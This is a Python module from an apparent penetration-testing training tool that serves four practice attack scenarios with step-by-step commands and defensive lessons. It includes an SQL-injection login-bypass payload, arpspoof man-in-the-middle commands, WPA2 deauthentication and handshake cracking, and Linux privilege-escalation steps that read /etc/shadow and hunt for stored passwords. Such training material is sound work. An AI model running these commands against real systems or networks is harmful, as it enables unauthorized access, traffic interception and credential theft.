"""Attack scenario practice."""

from pentrex.tools.registry import register

SCENARIOS = {
    "web_sql_injection": {
        "title": "SQL Injection on Login Form",
        "difficulty": "Beginner",
        "category": "Web Application",
        "setup": {
            "target": "Vulnerable login form at http://target.com/login",
            "objective": "Bypass authentication without valid credentials",
            "tools_needed": ["Browser", "Burp Suite (optional)"],
        },
        "steps": [
            {
                "step": 1,
                "task": "Identify the input fields",
                "hint": "Look for username and password fields in the form",
                "expected": "Found two input fields: username and password"
            },
            {
                "step": 2,
                "task": "Test for SQL injection vulnerability",
                "hint": "Try adding a single quote (') to trigger an error",
                "expected": "SQL error message reveals the application is vulnerable"
            },
            {
                "step": 3,
                "task": "Craft bypass payload",
                "hint": "Use OR condition to make WHERE clause always true",
                "payload": "admin' OR '1'='1' --",
                "expected": "Successfully logged in as admin"
            },
        ],
        "lessons": [
            "Always use parameterized queries",
            "Never display raw database errors to users",
            "Implement input validation",
        ],
    },
    "network_arp_spoofing": {
        "title": "ARP Spoofing Attack",
        "difficulty": "Intermediate",
        "category": "Network",
        "setup": {
            "target": "Intercept traffic between victim (192.168.1.10) and gateway (192.168.1.1)",
            "objective": "Perform Man-in-the-Middle attack on local network",
            "tools_needed": ["arpspoof or Ettercap", "Wireshark"],
            "requirements": "Must be on the same network segment",
        },
        "steps": [
            {
                "step": 1,
                "task": "Enable IP forwarding",
                "command": "echo 1 > /proc/sys/net/ipv4/ip_forward",
                "expected": "System now forwards packets instead of dropping them"
            },
            {
                "step": 2,
                "task": "Start ARP spoofing to victim",
                "command": "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
                "expected": "Victim's ARP cache now has attacker's MAC for gateway"
            },
            {
                "step": 3,
                "task": "Start ARP spoofing to gateway",
                "command": "arpspoof -i eth0 -t 192.168.1.1 192.168.1.10",
                "expected": "Gateway's ARP cache now has attacker's MAC for victim"
            },
            {
                "step": 4,
                "task": "Capture traffic",
                "command": "wireshark -i eth0",
                "expected": "Can see all traffic between victim and gateway"
            },
        ],
        "lessons": [
            "ARP has no authentication mechanism",
            "Use encrypted protocols (HTTPS, SSH)",
            "Implement Dynamic ARP Inspection on switches",
        ],
    },
    "wireless_wpa_crack": {
        "title": "WPA2 Handshake Capture and Crack",
        "difficulty": "Intermediate",
        "category": "Wireless",
        "setup": {
            "target": "WPA2-PSK protected WiFi network",
            "objective": "Capture handshake and crack the password",
            "tools_needed": ["Aircrack-ng suite", "Wordlist (rockyou.txt)"],
            "requirements": "Compatible wireless adapter with monitor mode",
        },
        "steps": [
            {
                "step": 1,
                "task": "Enable monitor mode",
                "command": "airmon-ng start wlan0",
                "expected": "Monitor interface created (wlan0mon)"
            },
            {
                "step": 2,
                "task": "Scan for networks",
                "command": "airodump-ng wlan0mon",
                "expected": "List of nearby networks with BSSID, channel, encryption"
            },
            {
                "step": 3,
                "task": "Target specific network",
                "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
                "expected": "Monitoring target network, waiting for handshake"
            },
            {
                "step": 4,
                "task": "Deauthenticate a client",
                "command": "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
                "expected": "Client disconnects and reconnects, handshake captured"
            },
            {
                "step": 5,
                "task": "Crack the handshake",
                "command": "aircrack-ng -w rockyou.txt capture-01.cap",
                "expected": "Password found if in wordlist"
            },
        ],
        "lessons": [
            "WPA2-PSK security depends on password strength",
            "Use long, complex passphrases",
            "Consider WPA3 or 802.1X for enterprise",
        ],
    },
    "system_privilege_escalation": {
        "title": "Linux Privilege Escalation",
        "difficulty": "Advanced",
        "category": "System Hacking",
        "setup": {
            "target": "Compromised Linux system with low-privilege shell",
            "objective": "Escalate to root privileges",
            "tools_needed": ["Linux commands", "LinPEAS (optional)"],
        },
        "steps": [
            {
                "step": 1,
                "task": "Gather system information",
                "commands": ["uname -a", "cat /etc/os-release", "id"],
                "expected": "Know kernel version, OS, current user context"
            },
            {
                "step": 2,
                "task": "Check sudo permissions",
                "command": "sudo -l",
                "expected": "List commands user can run as root"
            },
            {
                "step": 3,
                "task": "Find SUID binaries",
                "command": "find / -perm -4000 -type f 2>/dev/null",
                "expected": "List of binaries running with owner privileges"
            },
            {
                "step": 4,
                "task": "Check for writable /etc/passwd",
                "command": "ls -la /etc/passwd",
                "expected": "If writable, can add root user"
            },
            {
                "step": 5,
                "task": "Look for credentials",
                "commands": ["cat ~/.bash_history", "grep -r 'password' /var/www/", "cat /etc/shadow"],
                "expected": "Possible password reuse or stored credentials"
            },
        ],
        "lessons": [
            "Always patch systems (kernel exploits)",
            "Minimize SUID binaries",
            "Restrict sudo access",
            "Never store passwords in plain text",
        ],
    },
}


@register(
    name="get_scenario",
    description="Get a hands-on attack scenario to practice.",
    parameters={
        "scenario": {
            "type": "string",
            "description": "Scenario: web_sql_injection, network_arp_spoofing, wireless_wpa_crack, system_privilege_escalation"
        }
    }
)
def get_scenario(scenario: str) -> dict:
    key = scenario.lower().replace(" ", "_").replace("-", "_")
    
    if key not in SCENARIOS:
        return {
            "error": f"Scenario not found: {scenario}",
            "available": list(SCENARIOS.keys())
        }
    
    return SCENARIOS[key]


@register(
    name="list_scenarios",
    description="List all available practice scenarios.",
    parameters={},
    required=[]
)
def list_scenarios() -> dict:
    return {
        "scenarios": [
            {
                "key": k,
                "title": v["title"],
                "difficulty": v["difficulty"],
                "category": v["category"]
            }
            for k, v in SCENARIOS.items()
        ]
    }
